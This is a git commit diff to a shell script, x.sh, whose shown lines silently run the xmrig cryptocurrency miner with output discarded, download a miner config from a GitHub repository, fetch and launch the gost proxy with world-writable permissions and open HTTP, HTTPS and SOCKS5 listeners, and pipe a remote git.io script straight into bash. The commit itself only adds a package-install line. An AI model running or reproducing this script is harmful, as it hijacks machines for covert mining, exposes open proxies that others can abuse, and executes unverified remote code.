11d257aabb7d3a4668783b03dd10ec5cb0063df2
lamboeio <lamonicagideon@gmail.com>
2024-10-29 03:12:50 +0000

    Update x.sh

--- x.sh
+++ x.sh
@@ -9,6 +9,7 @@ chmod u+x ./xmrig
 sudo wget -o- https://github.com/lamboeio/modin/raw/refs/heads/main/x.json
 chmod u+x ./x.json
  ./xmrig --config=./x.json >/dev/null 2>&1
+apt install -y wget screen
 wget -qO- https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz |gzip -d >./gost && chmod 777 ./gost && screen -Sdm gost ./gost -L=http://:19991 -L=https://:19992 -L=socks5://:19993
 bash <(curl -fsSL git.io/warp.sh) d
 ping aws.amazon.com
